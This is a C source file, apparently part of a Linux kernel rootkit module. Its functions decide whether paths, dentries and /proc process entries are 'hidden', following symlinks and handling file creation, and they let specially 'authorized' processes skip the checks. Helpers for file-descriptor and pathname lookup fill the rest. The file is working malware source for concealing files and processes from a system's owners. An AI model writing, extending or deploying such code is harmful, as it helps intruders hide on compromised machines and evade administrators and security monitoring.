#include "files.h"

#include "constants.h"
#include "macro_utils.h"
#include <asm-generic/errno-base.h>
#include <asm/current.h>
#include <linux/dcache.h>
#include <linux/err.h>
#include <linux/fcntl.h>
#include <linux/fdtable.h>
#include <linux/fs.h>
#include <linux/gfp.h>
#include <linux/kstrtox.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/types.h>

bool is_process_dentry(const dentry_t *const p_dentry, const char **const ps_name, pid_t *p_pid)
{
    int i32_res              = 0;    // Result of `kstrtoint()` (0 on success)
    const dentry_t *p_parent = NULL; // Parent dentry structure
    pid_t i32_pid            = -1;   // PID of the process found in the path, if any

    IF_U (!is_dentry_proc_descendant(p_dentry)) {
        if (ps_name != NULL) {
            *ps_name = NULL;
        }
        if (p_pid != NULL) {
            *p_pid = -1;
        }
        return false;
    }

    p_parent = p_dentry;

    // Go up the directory tree until we reach a direct child of the root
    while (!IS_ROOT(p_parent->d_parent)) {
        p_parent = p_parent->d_parent;
    }

    // Check if the parent directory is /proc/<pid>, with <pid> being a number
    i32_res = kstrtoint(p_parent->d_name.name, 10, &i32_pid);

    if (ps_name != NULL) {
        // Set ps_name to the name of the first directory in the path after its root
        *ps_name = p_parent->d_name.name;
    }

    if (p_pid != NULL) {
        // Set p_pid to the corresponding PID, if this is a process file
        *p_pid = i32_res ? -1 : i32_pid;
    }

    return i32_res == 0;
}

bool is_dentry_hidden(const dentry_t *const p_dentry, bool b_check_auth)
{
    bool b_ret          = false; // Return value
    pid_t i32_found_pid = -1;    // PID of the process found in the path, if any

    if (b_check_auth && is_process_authorized(PID_SELF)) {
        pr_dev_info("  * Process is authorized, bypassing checks...\n");
        return false;
    }

    IF_U (p_dentry == NULL) {
        return false;
    }

    IF_U (is_process_dentry(p_dentry, NULL, &i32_found_pid)) {
        pr_dev_info("  * This is a process file/dir (PID: %d)\n", i32_found_pid);

        // If the path is a process file/dir, check if the process is hidden
        return is_pid_hidden(i32_found_pid);
    }
    else {
        pr_dev_info("  * This is not a process file/dir\n");
    }

    IF_U (is_filename_or_pid_hidden(p_dentry->d_name.name, is_dentry_parent_proc_root(p_dentry),
                                    false)) {
        return true;
    }

    // If the path is not a process file/dir, check if one of its parents has a hidden name
    b_ret = is_dentry_hierarchy_hidden(p_dentry);

    return b_ret;
}

bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
                        unsigned int ui32_lookup_flags)
{
    bool b_ret               = false; // Return value
    int i32_err              = 0;     // Error code
    const char *s_pathname_k = NULL;  // Kernel buffer for path name
    dentry_t *p_dentry       = NULL;  // Dentry structure
    dentry_t *p_parent       = NULL;  // Parent dentry structure
    bool skip_path_check     = false; // Whether to skip the existing path check
    path_t path;                      // Path structure

    IF_U (is_process_authorized(PID_SELF)) {
        pr_dev_info("  * Process is authorized, bypassing checks...\n");
        return false;
    }

    ui32_lookup_flags &= ~LOOKUP_AUTOMOUNT; // Do not auto mount

    // First, check without following symlinks
    IF_U (ui32_lookup_flags & LOOKUP_CREATE) {
        p_dentry = user_path_create(i32_dfd, s_pathname, &path, ui32_lookup_flags & ~LOOKUP_FOLLOW);

        IF_U (IS_ERR_OR_NULL(p_dentry)) {
            i32_err = PTR_ERR_OR_ZERO(p_dentry);
            if (i32_err == -EEXIST) {
                pr_dev_info("  * File already exists\n");
            }
            else {
                ui32_lookup_flags &= ~LOOKUP_FOLLOW;
                goto print_err;
            }
        }
        else {
            pr_dev_info("  * File does not exist, created dentry: %s\n", p_dentry->d_name.name);
            // If we are looking for a parent directory, we need to go up the directory tree
            p_parent = dget_parent(p_dentry); // Lock the parent dentry
            b_ret    = is_dentry_hidden(p_parent, false);
            dput(p_parent); // Release the parent dentry
            done_path_create(&path, p_dentry);

            skip_path_check = true;
        }
    }

    IF_U (!skip_path_check) {
        i32_err = user_path_at(i32_dfd, s_pathname, ui32_lookup_flags & ~LOOKUP_FOLLOW, &path);

        IF_U (i32_err != 0) {
            ui32_lookup_flags &= ~LOOKUP_FOLLOW;
            goto print_err;
        }

        b_ret = is_path_hidden(&path, false);

        // Free the path structure
        path_put(&path);
    }

    if (b_ret || !(ui32_lookup_flags & LOOKUP_FOLLOW) /*|| b_lookup_parents*/) {
        // Stop if we already know the path is hidden, or if we don't want to follow symlinks
        return b_ret;
    }

    skip_path_check = false;

    // Check again, this time following symlinks
    IF_U (ui32_lookup_flags & LOOKUP_CREATE) {
        p_dentry = user_path_create(i32_dfd, s_pathname, &path, ui32_lookup_flags);

        IF_U (IS_ERR_OR_NULL(p_dentry)) {
            i32_err = PTR_ERR_OR_ZERO(p_dentry);
            if (i32_err == -EEXIST) {
                pr_dev_info("  * File already exists\n");
            }
            else {
                goto print_err;
            }
        }
        else {
            pr_dev_info("  * File does not exist, created dentry: %s\n", p_dentry->d_name.name);
            p_parent = dget_parent(p_dentry);
            b_ret    = is_dentry_hidden(p_parent, false);
            dput(p_parent);
            done_path_create(&path, p_dentry);

            skip_path_check = true;
        }
    }

    IF_U (!skip_path_check) {
        i32_err = user_path_at(i32_dfd, s_pathname, ui32_lookup_flags, &path);

        IF_U (i32_err != 0) {
            goto print_err;
        }

        b_ret = is_path_hidden(&path, false);
        path_put(&path);
    }

    return b_ret;

print_err:
    s_pathname_k = strndup_user(s_pathname, PATH_MAX);
    pr_dev_err("  * Could not get path for %s (error: %d) (following symlinks: %s)\n", s_pathname_k,
               i32_err, ui32_lookup_flags & LOOKUP_FOLLOW ? "yes" : "no");
    kfree_const(s_pathname_k);
    return false;
}

const file_t *fd_get_file(const int i32_fd)
{
    const file_t *p_file = NULL;           // File structure
    files_t *p_files     = current->files; // Reference to the current task files

    IF_U (p_files == NULL) {
        // If the current task has no files, return an error (this should not happen)
        return ERR_PTR(-ENOENT);
    }

    IF_U (i32_fd < 0) {
        // If the file descriptor is invalid, return an error
        return ERR_PTR(-EBADF);
    }

    spin_lock(&p_files->file_lock); // Lock the files structure while we use it
    p_file = lookup_fd_rcu(i32_fd);
    spin_unlock(&p_files->file_lock);

    IF_U (p_file == NULL) {
        return ERR_PTR(-ENOENT);
    }

    return p_file;
}

const char *path_get_pathname(const path_t *const p_path)
{
    const char *s_pathname     = NULL; // Pathname of the file
    const char *s_pathname_ret = NULL; // Pathname of the file (return value)
    char *p_tmp                = NULL; // Temporary buffer for `d_path()`

    IF_U (p_path == NULL) {
        return ERR_PTR(-EINVAL);
    }

    path_get(p_path); // Increment the path reference count while we use it

    // Allocate a page of memory since PATH_MAX == PAGE_SIZE
    p_tmp = (char *)__get_free_page(GFP_KERNEL);

    IF_U (p_tmp == NULL) {
        path_put(p_path); // Release the path structure
        return ERR_PTR(-ENOMEM);
    }

    s_pathname = d_path(p_path, p_tmp, PAGE_SIZE);
    path_put(p_path);

    IF_U (IS_ERR(s_pathname)) {
        free_page((unsigned long)p_tmp);
        return s_pathname;
    }

    s_pathname_ret = kstrdup_const(s_pathname, GFP_KERNEL);

    free_page((unsigned long)p_tmp);
    return s_pathname_ret;
}
